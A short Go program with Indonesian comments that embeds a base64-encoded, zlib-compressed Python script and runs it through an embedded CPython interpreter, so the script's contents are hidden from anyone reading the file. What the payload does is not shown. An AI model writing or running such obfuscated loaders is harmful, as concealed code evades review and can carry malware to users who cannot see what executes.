package main

/*
// Menggunakan 'python3' sebagai target pkg-config untuk kompatibilitas luas.
#cgo pkg-config: python3

// LDFLAGS secara eksplisit menautkan pustaka Python versi spesifik untuk build yang andal.
#cgo LDFLAGS: -lpython3.13

#include <Python.h>
*/
import "C"
import (
	"bytes"
	"compress/zlib"
	"encoding/base64"
	"io"
	"log"
	"unsafe"
)

const codeB64 = `eJzVVs1q20AQvgfyDtM92eAKYuglkENaKDRNSkgOPYpRtLLWklZmf1KcNn2CQCCQQqDFlxZ67DF9nbxA/QidleRIcqz8nEr3Ymt39pv5vm+0q6MUtYbd/Ji/zhU/5mpzfQ1ohDwC3xdSGN/vaZ5GA5CY8Y3yZ9ivwtxgjNUPb6TQAlOhUQvIgzFPmuAEK0coHQZCaBEmqIzkyltfqyH2UVEKw5Wu557fjnquqAc2QRtVT7rxzqFXyDDhytCz1943fHBfwqk+r4OlE8SrIjdgqyxl9fKwWh4uKDpldZx/8FPSpZC2U8w9Lo+4wYRIaFLtSEiDgAGGApD+qpaGAwjFyEpMKLKGsNLYBDIurRzbxK0leSYMTVRwU5SjCjOkVSPCIp+SGDdgAq4wiYXy4FWxixqDWGqLYmGpxiBEkjAQsGdjzDIM4XD7fYnfAgqsnApgFZCxXdkXOVmrOw64sUrebY2G+su+7j9CvS6nVZEOIvax5fkp3Hz7/uf6HFrTw1P4VLQ75BEg7IqIG5FxmM/Orm++/mTNFpgo8kFz3+T+GCXxfWQrUPBYPNgKpe2aXkRSn8wu4kuNNdWEDUc0ZhNa2imKGABiJoT8L33eeYQ0T/bZlbtsMlVc2vCgzB3izmeXZ/PZxRd251AYKTSkVfi0k0FPbWJVVc6CaaeFNQyOSR7Z5ea/e1dX8rnfuV4bJ2LbKfEJbSrS1Em/7CtVXGUJiCs3MCGqCAlmdrBsuAesjc4OeZaPKFqQLBSLqaXTlyATjAVdHQHGOBJITJxSCXEKnNAD0hU/k/s/fs1nV+cN0L6TzTVBhkL2Frbf8rznIig1OshPYkyWdqn85GRK10/jAu6xMpINgG0nxPQluRiiEvCWiLN+uXGiKEGv2O7VV1V/xerdU2xV1FJn9/uLJolyBYI6FJTzoPei2e8lQMTo8PxN78pl1c6F5CV1J3yG5JrTtZLgWaXuxaXbx4pMwn3KuDvY92FrC5jvO5V9n1XZSs3/AsJBtAc=`

func decodeAndDecompress(encoded string) []byte {
	decoded, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		log.Fatalf("FATAL: Proses dekode base64 gagal: %v", err)
	}

	b := bytes.NewReader(decoded)
	r, err := zlib.NewReader(b)
	if err != nil {
		log.Fatalf("FATAL: Inisialisasi zlib reader gagal: %v", err)
	}
	defer r.Close()

	decompressed, err := io.ReadAll(r)
	if err != nil {
		log.Fatalf("FATAL: Proses dekompresi zlib gagal: %v", err)
	}
	return decompressed
}

func main() {
	pySrc := decodeAndDecompress(codeB64)

	C.Py_Initialize()
	if C.Py_IsInitialized() == 0 {
		log.Fatal("FATAL: Inisialisasi interpreter Python gagal.")
	}

	cStr := C.CString(string(pySrc))
	defer C.free(unsafe.Pointer(cStr))

	if C.PyRun_SimpleString(cStr) != 0 {
		log.Fatal("FATAL: Eksekusi skrip Python gagal.")
	}

	C.Py_Finalize()
}